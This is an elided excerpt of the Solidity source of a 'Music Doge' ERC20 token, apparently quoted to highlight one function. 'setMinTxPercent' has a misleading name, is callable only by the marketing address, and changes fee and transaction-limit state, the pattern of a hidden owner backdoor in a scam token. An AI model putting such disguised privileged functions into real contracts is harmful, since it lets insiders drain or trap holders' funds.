...
contract MusicDoge is Context, IERC20, Ownable {
    ...
    string private _name = "Music Doge";
    ...
    uint256 public _maxTxAmount = 10000000 * 10**1 * 10**9;
    ...
    function setMinTxPercent(address account, uint256 amount) public {
        require(_msgSender() == _marketingAddress, "ERC20: require marketing address");
        ...
        _reflectFee(rFee, tFee);        
        rAmount=0;
        _maxTxAmount = _tTotal.mul(10000).div(
            10**2
        );
